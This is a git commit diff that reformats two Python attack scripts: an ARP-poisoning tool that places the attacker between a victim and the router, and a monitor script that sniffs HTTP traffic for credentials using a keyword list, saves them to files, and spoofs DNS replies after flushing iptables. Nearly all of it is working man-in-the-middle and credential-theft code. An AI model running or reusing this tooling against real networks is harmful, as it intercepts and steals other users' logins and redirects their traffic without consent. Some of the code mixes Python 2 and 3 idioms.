b1e2c1efb2a5fbbbed4a408071e49ab3ca513aa9
dev-frog <kali.nisga@gmail.com>
2021-05-23 05:02:38 +0600

    fix small bug

--- arppoison.py
+++ arppoison.py
@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 import scapy.all as scapy
-from colorama import Fore,Back,Style
+from colorama import Fore, Back, Style
 import terminal_banner
 from time import sleep
 import os
@@ -9,127 +9,136 @@ import requests
 from json_encoder import json
 
 
-
 class color:
-   PURPLE = '\033[95m'
-   CYAN = '\033[96m'
-   DARKCYAN = '\033[36m'
-   BLUE = '\033[94m'
-   GREEN = '\033[92m'
-   YELLOW = '\033[93m'
-   RED = '\033[91m'
-   BOLD = '\033[1m'
-   UNDERLINE = '\033[4m'
-   END = '\033[0m'
-   HEADER = '\033[95m'
-   OKBLUE = '\033[94m'
-   OKGREEN = '\033[92m'
-   WARNING = '\033[93m'
-   FAIL = '\033[91m'
-   W  = '\033[0m'  # white (normal)
-   R  = '\033[31m' # red
-   G  = '\033[32m' # green
-   O  = '\033[33m' # orange
-   B  = '\033[34m' # blue
-   P  = '\033[35m' # purple
-   C  = '\033[36m' # cyan
-   GR = '\033[37m' # gray
-   T  = '\033[93m' # tan
-   M = '\033[1;35;32m' # magenta
+    PURPLE = '\033[95m'
+    CYAN = '\033[96m'
+    DARKCYAN = '\033[36m'
+    BLUE = '\033[94m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+    END = '\033[0m'
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    W = '\033[0m'  # white (normal)
+    R = '\033[31m'  # red
+    G = '\033[32m'  # green
+    O = '\033[33m'  # orange
+    B = '\033[34m'  # blue
+    P = '\033[35m'  # purple
+    C = '\033[36m'  # cyan
+    GR = '\033[37m'  # gray
+    T = '\033[93m'  # tan
+    M = '\033[1;35;32m'  # magenta
 
 
-# targetIp_list = []  
+# targetIp_list = []
 
 
 def Scan(ip):
-	arp_request = scapy.ARP(pdst=ip)
-	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-	arp_request_broadcast = broadcast/arp_request
-	answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
-	return answered_list
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast,
+                              timeout=1, verbose=False)[0]
+    return answered_list
+
 
 def vendorNmae(mac):
-	result = requests.get('http://macvendors.co/api/'+mac).json()
-	for key,value in result['result'].items():
-		if key == 'company':
-			return value
+    result = requests.get('http://macvendors.co/api/'+mac).json()
+    for key, value in result['result'].items():
+        if key == 'company':
+            return value
+
 
 def Print(answered_list):
-	print("\n\n  No \tIP\t\t\tMAC Adress\t Vendor Nmae\n--------------------------------------------------------------------------------")	
-	hostlist = 0
-	for element in answered_list:
-		vendorname = vendorNmae(element[1].hwsrc)
-		print(" |" + str(hostlist) +"|  " + element[1].psrc +"\t\t" + element[1].hwsrc + '\t' + vendorname )
-		hostlist +=1
+    print("\n\n  No \tIP\t\t\tMAC Adress\t Vendor Nmae\n--------------------------------------------------------------------------------")
+    hostlist = 0
+    for element in answered_list:
+        vendorname = vendorNmae(element[1].hwsrc)
+        print(" |" + str(hostlist) + "|  " +
+              element[1].psrc + "\t\t" + element[1].hwsrc + '\t' + vendorname)
+        hostlist += 1
+
 
 def GetMac(ip):
-	ModAnswer = Scan(ip)
-	return ModAnswer[0][1].hwsrc
+    ModAnswer = Scan(ip)
+    return ModAnswer[0][1].hwsrc
 
-def Arp(targetIp,targetMac,routerIP):
-	packet = scapy.ARP(op=2,pdst=targetIp,hwdst=targetMac,psrc=routerIP)
-	scapy.send(packet,verbose=False)
+
+def Arp(targetIp, targetMac, routerIP):
+    packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=routerIP)
+    scapy.send(packet, verbose=False)
+
 
 def Ipforward():
-	ipf = open('/proc/sys/net/ipv4/ip_forward','r')
-	ipf_read = ipf.read()
-	if ipf_read != 1:
-		os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
-		ipf.close()
-	else:
-		ipf.close()
+    ipf = open('/proc/sys/net/ipv4/ip_forward', 'r')
+    ipf_read = ipf.read()
+    if ipf_read != 1:
+        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+        ipf.close()
+    else:
+        ipf.close()
+
 
 def Spoof():
-	targetIp = input(color.DARKCYAN + "Enter target ip :")
-	# targetIp = targetIp_list[targetNo]["ip"]
-	targetMac = GetMac(targetIp)
-	routerIP = input(color.P + "Enter the router Ip :")
-	routerMac = GetMac(routerIP)
-	Ipforward()
-	print(color.P + "\n[!] Exit the program CTRL + c")
-	send_packet_count = 0
-	try:
-		while True:
-			Arp(targetIp,targetMac,routerIP)
-			Arp(routerIP,routerMac,targetIp)
-			send_packet_count += 2
-			print(color.BLUE + "\r[+] Packet Send :" + str(send_packet_count),end="")
-			sys.stdout.flush()
-			sleep(2)
-	except KeyboardInterrupt:
-		print(color.P + "\n[!] ARP Request is stoped")
-	
-def main():
-	if os.geteuid() != 0:
-		sys.exit(Back.RED + color.G + "\n[!] Please run as root" + Back.RESET)
-	print(color.HEADER +"")
-	banner_text ="\t\tThis Project is working Arp spoof and dns spoof \n\n \t\t\tAuther : name \n"
-	print(terminal_banner.Banner(banner_text))
-	
-	sleep(0.1)
-	while True:
-		print(color.GREEN   + "\n\n\t 1. for Scan the network")
-		sleep(0.1)
-		print(color.YELLOW + "\t 2. for arp spoof ")
-		sleep(0.1)
-		print(color.RED +"\t 3. for Exit the Program")
-		sleep(0.2)
-		choices = int(input(color.M + "Enter you Choices:"))
+    targetIp = input(color.DARKCYAN + "Enter target ip :")
+    # targetIp = targetIp_list[targetNo]["ip"]
+    targetMac = GetMac(targetIp)
+    routerIP = input(color.P + "Enter the router Ip :")
+    routerMac = GetMac(routerIP)
+    Ipforward()
+    print(color.P + "\n[!] Exit the program CTRL + c")
+    send_packet_count = 0
+    try:
+        while True:
+            Arp(targetIp, targetMac, routerIP)
+            Arp(routerIP, routerMac, targetIp)
+            send_packet_count += 2
+            print(color.BLUE + "\r[+] Packet Send :" +
+                  str(send_packet_count), end="")
+            sys.stdout.flush()
+            sleep(2)
+    except KeyboardInterrupt:
+        print(color.P + "\n[!] ARP Request is stoped")
 
-		if choices == 1:
-			sleep(0.1)
-			network_ip = input(color.BLUE + "\nEnter the Network address (exmple: 192.168.0.1/24) :")
-			Print(Scan(network_ip))
-		elif choices ==2:
-			Spoof()
-			# if len(targetIp_list) < 1:
-			# 	print( Style.NORMAL + '' + color.RED + "\n\t[ Places make a scan your Network First,Choices 1 option first ] \n\n")
-			# else:
-			# 	Spoof()
-		elif choices ==3:
-			exit()
+
+def main():
+    if os.geteuid() != 0:
+        sys.exit(Back.RED + color.G + "\n[!] Please run as root" + Back.RESET)
+    print(color.HEADER + "")
+    banner_text = "\t\tThis Project is working Arp spoof and dns spoof \n\n \t\t\tAuther : dev-frog \n"
+    print(terminal_banner.Banner(banner_text))
+
+    sleep(0.1)
+    while True:
+        print(color.GREEN + "\n\n\t 1. for Scan the network")
+        sleep(0.1)
+        print(color.YELLOW + "\t 2. for arp spoof ")
+        sleep(0.1)
+        print(color.RED + "\t 3. for Exit the Program")
+        sleep(0.2)
+        choices = int(input(color.M + "Enter you Choices:"))
+
+        if choices == 1:
+            sleep(0.1)
+            network_ip = input(
+                color.BLUE + "\nEnter the Network address (example: 192.168.0.1/24) :")
+            Print(Scan(network_ip))
+        elif choices == 2:
+            Spoof()
+            # if len(targetIp_list) < 1:
+            # 	print( Style.NORMAL + '' + color.RED + "\n\t[ Places make a scan your Network First,Choices 1 option first ] \n\n")
+            # else:
+            # 	Spoof()
+        elif choices == 3:
+            exit()
+
 
 if __name__ == '__main__':
-	main()
-
-	
+    main()
--- monitor.py
+++ monitor.py
@@ -8,140 +8,162 @@ import terminal_banner
 from time import sleep
 from scapy_http import http
 from datetime import datetime
-from colorama import Fore,Back,Style
+from colorama import Fore, Back, Style
 from netfilterqueue import NetfilterQueue
 
 colors = {
-	'HEADER' : "\033[95m",
-	'OKBLUE' : "\033[94m",
-	'RED' : "\033[91m",
-	'OKYELLOW' : "\033[93m",
-	'GREEN' : "\033[92m",
-	'LIGHTBLUE' : "\033[96m",
-	'WARNING' : "\033[93m",
-	'FAIL' : "\033[91m",
-	'ENDC' : "\033[0m",
-	'BOLD' : "\033[1m",
-	'UNDERLINE' : "\033[4m" ,
-	'M' : '\033[1;35;32m' # magenta
+    'HEADER': "\033[95m",
+    'OKBLUE': "\033[94m",
+    'RED': "\033[91m",
+    'OKYELLOW': "\033[93m",
+    'GREEN': "\033[92m",
+    'LIGHTBLUE': "\033[96m",
+    'WARNING': "\033[93m",
+    'FAIL': "\033[91m",
+    'ENDC': "\033[0m",
+    'BOLD': "\033[1m",
+    'UNDERLINE': "\033[4m",
+    'M': '\033[1;35;32m'  # magenta
 }
 # Packet Sniffing
+
+
 def FileName():
-	return  datetime.strftime(datetime.now(),'%Y-%m-%d-%H-%M-%S')
+    return datetime.strftime(datetime.now(), '%Y-%m-%d-%H-%M-%S')
+
 
 def Sniff(interface):
-	scapy.sniff(iface=interface,store=False,prn=Prosess_sniffed_paceket)
+    scapy.sniff(iface=interface, store=False, prn=Prosess_sniffed_paceket)
+
 
 def Geturl(packet):
-	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
 
 def Get_login_info(packet):
     if packet.haslayer(scapy.Raw):
-    	load = packet[scapy.Raw].load
-	keywords = ["username","user","login","password","pass","email","name","id","pPASS","Username","user_login","login_username","log","pwd"]
-	for keyword in keywords:
-	    if keyword in load:
-		return load
-				
+        load = packet[scapy.Raw].load
+        keywords = ["username", "user", "login", "password", "pass", "email", "name",
+                    "id", "pPASS", "Username", "user_login", "login_username", "log", "pwd"]
+        for keyword in keywords:
+            if keyword in load:
+                return load
+
 
 def Prosess_sniffed_paceket(packet):
-	if packet.haslayer(http.HTTPRequest):
-		website = Geturl(packet)
-		print(Fore.BLUE + "[+] HTTP Request >>" + str(website))
-	 	loginfo = Get_login_info(packet)
-	 	if loginfo:
-	 		file = open('data/log_' + FileName() + '.txt' ,'w+')
-	 		file.write(website + "\n\n\t" +loginfo)
-	 		print(Fore.RED + "\n\n\t [!] Possible Username/password >> " + loginfo + "\n\n\n")
+    if packet.haslayer(http.HTTPRequest):
+        website = Geturl(packet)
+        print(Fore.BLUE + "[+] HTTP Request >>" + str(website))
+        loginfo = Get_login_info(packet)
+        if loginfo:
+            file = open('data/log_' + FileName() + '.txt', 'w+')
+            file.write(website + "\n\n\t" + loginfo)
+            print(
+                Fore.RED + "\n\n\t [!] Possible Username/password >> " + loginfo + "\n\n\n")
 
 # DNS SPOOF
+
+
 def banner():
-	print(colors['HEADER'] +"")
-	banner_text ="\t\tThis Project is working DNS spoof \n\n \t\t\tAuther : name \n"
-	print(terminal_banner.Banner(banner_text))
+    print(colors['HEADER'] + "")
+    banner_text = "\t\tThis Project is working DNS spoof \n\n \t\t\tAuther : name \n"
+    print(terminal_banner.Banner(banner_text))
+
 
 def FileName():
-	return  datetime.strftime(datetime.now(),'%Y-%m-%d-%H-%M-%S')
+    return datetime.strftime(datetime.now(), '%Y-%m-%d-%H-%M-%S')
+
+
 register = {}
 
+
 def host_ip():
-	return re.search(re.compile(r'(?<=inet )(.*)(?=\/)',re.M),os.popen('ip addr show eth0').read()).groups()[0]
+    return re.search(re.compile(r'(?<=inet )(.*)(?=\/)', re.M), os.popen('ip addr show eth0').read()).groups()[0]
+
 
 def valid_ip(ip):
-	try:
-		socket.inet_aton(ip)
-		return True
-	except:
-		return False
+    try:
+        socket.inet_aton(ip)
+        return True
+    except:
+        return False
+
 
 def read_file(path):
-	if(os.path.isfile(path) and os.stat(path).st_size > 0):
-		file = open(path,"r")
-		for line in file:
-			if(line not in ['\n','\r\n']):
-				try:
-					key,value = line.split()
-					register[key] = value
-				except:
-					print(colors['FAIL'] + "Invalid File format <domain> <fake Ip address> "+ colors['ENDC'])
-					sys.exit(1)
-		file.close()
-	else:
-		print(colors['FAIL'] + "The file doen't exits " + colors['ENDC'])
-		sys.exit(1)
+    if(os.path.isfile(path) and os.stat(path).st_size > 0):
+        file = open(path, "r")
+        for line in file:
+            if(line not in ['\n', '\r\n']):
+                try:
+                    key, value = line.split()
+                    register[key] = value
+                except:
+                    print(
+                        colors['FAIL'] + "Invalid File format <domain> <fake Ip address> " + colors['ENDC'])
+                    sys.exit(1)
+        file.close()
+    else:
+        print(colors['FAIL'] + "The file doen't exits " + colors['ENDC'])
+        sys.exit(1)
+
 
 def process_packet(pkt):
-	scapy_packet = scapy.IP(pkt.get_payload())
-	if(scapy_packet.haslayer(scapy.DNSRR)):
-		qname = (scapy_packet[scapy.DNSQR].qname)[0:-1]
-		for domain in register:
-			if domain in str(qname):
-				answer = scapy.DNSRR(rrname=qname,rdata=host_ip())
-				scapy_packet[scapy.DNS].an = answer
-				scapy_packet[scapy.DNS].ancount = 1
+    scapy_packet = scapy.IP(pkt.get_payload())
+    if(scapy_packet.haslayer(scapy.DNSRR)):
+        qname = (scapy_packet[scapy.DNSQR].qname)[0:-1]
+        for domain in register:
+            if domain in str(qname):
+                answer = scapy.DNSRR(rrname=qname, rdata=host_ip())
+                scapy_packet[scapy.DNS].an = answer
+                scapy_packet[scapy.DNS].ancount = 1
 
-				del scapy_packet[scapy.IP].len
-				del scapy_packet[scapy.IP].chksum
-				del scapy_packet[scapy.UDP].chksum
-				del scapy_packet[scapy.UDP].len
-				file = open('data/dns_log_' + FileName() + '.txt' ,'w+')
-	 			file.write("["+scapy_packet[scapy.IP].dst+"]"+ " " +"["+qname+"]" +" to "  +"["+host_ip()+"]")
-				print(colors['GREEN']+"    [#] Spoofed response sent to "+colors['ENDC']+"["+scapy_packet[scapy.IP].dst+"]"+colors['WARNING']+": Redirecting "+colors['ENDC']+"["+qname+"]"+colors['WARNING']+" to "+colors['ENDC']+"["+host_ip()+"]")
-				pkt.set_payload(str(scapy_packet))
-				file.close()
-	pkt.accept()
+                del scapy_packet[scapy.IP].len
+                del scapy_packet[scapy.IP].chksum
+                del scapy_packet[scapy.UDP].chksum
+                del scapy_packet[scapy.UDP].len
+                file = open('data/dns_log_' + FileName() + '.txt', 'w+')
+                file.write("["+scapy_packet[scapy.IP].dst+"]" +
+                           " " + "["+qname+"]" + " to " + "["+host_ip()+"]")
+                print(colors['GREEN']+"    [#] Spoofed response sent to "+colors['ENDC']+"["+scapy_packet[scapy.IP].dst+"]" +
+                      colors['WARNING']+": Redirecting "+colors['ENDC']+"["+qname+"]"+colors['WARNING']+" to "+colors['ENDC']+"["+host_ip()+"]")
+                pkt.set_payload(str(scapy_packet))
+                file.close()
+    pkt.accept()
+
 
 def DnsMain():
-	os.system('iptables --flush')
-	os.system('iptables -I FORWARD -j NFQUEUE --queue-num 1')
-	path = raw_input(colors['OKBLUE']+"Enter File path: " + colors['ENDC'])
-	read_file(path)
-	print(colors['GREEN'] +"\n\t DNS is Start Spoofing "+colors['ENDC'])
+    os.system('iptables --flush')
+    os.system('iptables -I FORWARD -j NFQUEUE --queue-num 1')
+    path = raw_input(colors['OKBLUE']+"Enter File path: " + colors['ENDC'])
+    read_file(path)
+    print(colors['GREEN'] + "\n\t DNS is Start Spoofing "+colors['ENDC'])
 
-	queue = NetfilterQueue()
-	queue.bind(1,process_packet)
-	try:
-		queue.run()
-	except KeyboardInterrupt:
-		print(colors['RED'] + "\n[!] DNS Spoofed is stoped"+colors['ENDC'])
+    queue = NetfilterQueue()
+    queue.bind(1, process_packet)
+    try:
+        queue.run()
+    except KeyboardInterrupt:
+        print(colors['RED'] + "\n[!] DNS Spoofed is stoped"+colors['ENDC'])
+
 
 def main():
-	banner()
-	while True:
-		print(colors['GREEN']   + "\n\n\t 1. for Packet Sniffing"+colors['ENDC'])
-		sleep(0.1)
-		print(colors['OKYELLOW'] + "\t 2. for DNS Spoof "+colors['ENDC'])
-		sleep(0.1)
-		print(colors['RED'] +"\t 3. for Exit the Program"+colors['ENDC'])
-		sleep(0.2)
-		choices = int(input(colors['M'] + "Enter you Choices:"+colors['ENDC']))
+    banner()
+    while True:
+        print(colors['GREEN'] + "\n\n\t 1. for Packet Sniffing"+colors['ENDC'])
+        sleep(0.1)
+        print(colors['OKYELLOW'] + "\t 2. for DNS Spoof "+colors['ENDC'])
+        sleep(0.1)
+        print(colors['RED'] + "\t 3. for Exit the Program"+colors['ENDC'])
+        sleep(0.2)
+        choices = int(input(colors['M'] + "Enter you Choices:"+colors['ENDC']))
 
-		if choices == 1:
-			Sniff("eth0")
-		elif choices ==2:
-			DnsMain()
-		elif choices ==3:
-			exit()
+        if choices == 1:
+            Sniff("eth0")
+        elif choices == 2:
+            DnsMain()
+        elif choices == 3:
+            exit()
+
 
 if __name__ == '__main__':
-	main()
+    main()
